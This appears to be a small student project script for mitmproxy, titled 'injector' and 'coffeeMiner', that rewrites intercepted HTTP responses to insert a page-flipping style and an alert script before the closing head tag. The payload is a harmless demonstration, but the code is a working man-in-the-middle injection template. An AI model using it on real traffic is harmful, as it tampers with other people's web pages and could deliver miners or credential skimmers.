#!/usr/bin/env python3

##
## EPITECH PROJECT, 2019
## injector
## File description:
## coffeeMiner
##

from mitmproxy import http

def response(flow: http.HTTPFlow):
    reflector = b"<style>body {transform: scaleX(-1) scaleY(-1);}</style><script>alert('script injected !');</script></head>"
    flow.response.content = flow.response.content.replace(b"</head>", reflector)
